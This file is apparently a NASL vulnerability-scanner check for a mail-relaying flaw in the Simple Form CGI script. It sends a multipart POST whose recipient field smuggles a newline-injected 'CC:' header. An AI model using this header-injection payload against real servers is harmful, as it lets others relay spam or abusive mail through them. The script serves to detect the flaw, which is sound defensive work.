if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.14713" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "Simple Form Mail Relaying via Subject Tags Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade to Simple Form 2.3 or later." );
	script_tag( name: "summary", value: "The target is running at least one instance of Simple Form which fails
  to remove newlines from variables used to construct message headers." );
	script_tag( name: "impact", value: "A remote attacker can exploit this flaw to add to the list of
  recipients, enabling him to use Simple Form on the target as a proxy for sending abusive mail or spam." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
host = http_host_name( port: port );
vt_strings = get_vt_strings();
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/s_form.cgi";
	if(http_is_cgi_installed_ka( item: url, port: port )){
		boundary = "bound";
		req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Referer: http://", host, "/\\r\\n", "Content-Type: multipart/form-data; boundary=", boundary, "\\r\\n" );
		boundary = NASLString( "--", boundary );
		postdata = NASLString( boundary, "\\r\\n", "Content-Disposition: form-data; name=\"form_response_title\"", "\\r\\n", "\\r\\n", "A Response\\r\\n", boundary, "\\r\\n", "Content-Disposition: form-data; name=\"form_return_url\"", "\\r\\n", "\\r\\n", "http://", host, "/\\r\\n", boundary, "\\r\\n", "Content-Disposition: form-data; name=\"form_return_url_title\"", "\\r\\n", "\\r\\n", "Home\\r\\n", boundary, "\\r\\n", "Content-Disposition: form-data; name=\"form_fields\"", "\\r\\n", "\\r\\n", "msg\\r\\n", boundary, "\\r\\n", "Content-Disposition: form-data; name=\"required_fields\"", "\\r\\n", "\\r\\n", "msg\\r\\n", boundary, "\\r\\n", "Content-Disposition: form-data; name=\"form_email_subject\"", "\\r\\n", "\\r\\n", vt_strings["uppercase"], ":!:xtra_recipients:!:\\r\\n", boundary, "\\r\\n", "Content-Disposition: form-data; name=\"subject_tag_field\"", "\\r\\n", "\\r\\n", "xtra_recipients\\r\\n", boundary, "\\r\\n", "Content-Disposition: form-data; name=\"xtra_recipients\"", "\\r\\n", "\\r\\n", "\\nCC: victim@example.com\\r\\n", boundary, "\\r\\n", "Content-Disposition: form-data; name=\"msg\"", "\\r\\n", "\\r\\n", "This is a mail relaying test.\\r\\n", boundary, "\\r\\n", "Content-Disposition: form-data; name=\"preview_data\"", "\\r\\n", "\\r\\n", "yes\\r\\n", boundary, "\\r\\n", "Content-Disposition: form-data; name=\"preview_response_title\"", "\\r\\n", "\\r\\n", vt_strings["lowercase"], boundary, "--", "\\r\\n" );
		req = NASLString( req, "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, vt_strings["uppercase_rand"] ) && ContainsString( res, ":!:xtra_recipients:!:" ) && !ContainsString( res, vt_strings["lowercase"] )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

